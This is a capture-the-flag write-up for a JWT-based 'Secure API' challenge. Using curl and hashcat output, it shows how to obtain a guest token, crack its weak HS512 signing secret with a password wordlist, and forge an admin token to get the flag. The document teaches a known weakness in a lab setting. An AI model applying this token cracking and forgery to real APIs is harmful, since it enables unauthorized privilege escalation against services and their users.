# Secure API

## Challenge:

Frontend is overrated! API rocks! http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/

## Solution:

If we look at the URL we’re given it’s clearly an API.

```bash
$ curl http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/
{"Error":"Authorization header not found! Try to login with guest credentials."}
```

We can try setting an `Authorization` [header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) as it suggests, but `curl -u ‘username:password’` makes this easy for us:

```bash
$ curl -u 'guest:guest' http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/
{"Error":"Authorization header not found! Try to login with guest credentials."}
```

Unfortunately that still isn’t working.

But, it turns out there’s a login endpoint:

```bash
$ curl http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

Let’s try to send a username and password as JSON:

```bash
$ curl -H 'Content-Type: application/json' http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login -d '{"username": "guest", "password": "guest"}'
{"Error":"Missing username or password field."}
```

That didn’t work. But the word “field” is a clue. What if we treat this like an HTML form:

```bash
$ curl -X POST -F 'username=guest' -F 'password=guest' http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login
{"Token":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMTgwMjk1fQ.g3Mln7hQArxS_aA5eTNg5KPtLKFM6eKDBy4IbemJ4OmIETkhI6m0ka4XJi69IBeW_ydTnRPpJ56mrE-X0M_BBQ"}
```

That worked! Now we have a bearer token we can use for the first link.

```bash
$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMTgwMjk1fQ.g3Mln7hQArxS_aA5eTNg5KPtLKFM6eKDBy4IbemJ4OmIETkhI6m0ka4XJi69IBeW_ydTnRPpJ56mrE-X0M_BBQ' http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/
{"Message":"Hi, guest! You are not admin, I have no secret for you."}
```

We can try to [re-encode the token](https://jwt.io/) and call ourselves admin, but without a valid signature, it fails:

```bash
$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjIxMTgwMjk1fQ.7uYliYA73N3GIe6YhZvWpfjQxAyNWd-_qWikjG39UCpdD4lfWCAnjPR523htJb-lRtzUkOJ3E5XWsQ261J4rYQ' http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/
{"message":"Authorization failed!"}
```

It looks like we need to find the secret so we can sign a new token. We can try using [hashcat](https://hashcat.net/) to crack it.

We could brute force it with something like `hashcat jwt.txt -m 16500 -a 3`, but that will take a little while. Let’s try a [password list](https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt) instead:

```bash
$ hashcat jwt.txt -m 16500 darkweb2017-top10000.txt
hashcat (v6.1.1) starting...

...

Host memory required for this attack: 204 MB

Dictionary cache built:
* Filename..: darkweb2017-top10000.txt
* Passwords.: 9999
* Bytes.....: 82603
* Keyspace..: 9999
* Runtime...: 0 secs

...

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMTgzNDA4fQ.z_BebT2HRYahSpjsbAyWlmdiNrxc6wAsg12ecsreUqQ:147852369

Session..........: hashcat
Status...........: Cracked
Hash.Name........: JWT (JSON Web Token)
Hash.Target......: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZS...sreUqQ
Time.Started.....: Sun May 16 18:31:00 2021 (0 secs)
Time.Estimated...: Sun May 16 18:31:00 2021 (0 secs)
Guess.Base.......: File (darkweb2017-top10000.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1590.7 kH/s (0.04ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9999/9999 (100.00%)
Rejected.........: 0/9999 (0.00%)
Restore.Point....: 0/9999 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> starstar

Started: Sun May 16 18:30:59 2021
Stopped: Sun May 16 18:31:01 2021
$ hashcat jwt.txt -m 16500 darkweb2017-top10000.txt --show
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMTgzNDA4fQ.z_BebT2HRYahSpjsbAyWlmdiNrxc6wAsg12ecsreUqQ:147852369
```

Almost immediately, we have our secret: `147852369`. Now let’s sign a JWT. We’ll update `username` to `admin` and generate an expiration value that we know has’t elapsed:

```bash
$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyNjIxMTgzNDA4fQ.peAoqak9Srsl0EhPb7lKM-DHg-vvdIOGZ3nlLhwMeu9UsVhubojK2SIp4W6GXrgXpRAt-Q9znmfiW8K44hOSZw' http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/
{"Message":"Hi, admin! I have a secret for you.","Secret":"dctf{w34k_k3y5_4r3_n0t_0k4y}"}
```

And that’s all it takes to get our flag: `dctf{w34k_k3y5_4r3_n0t_0k4y}`.
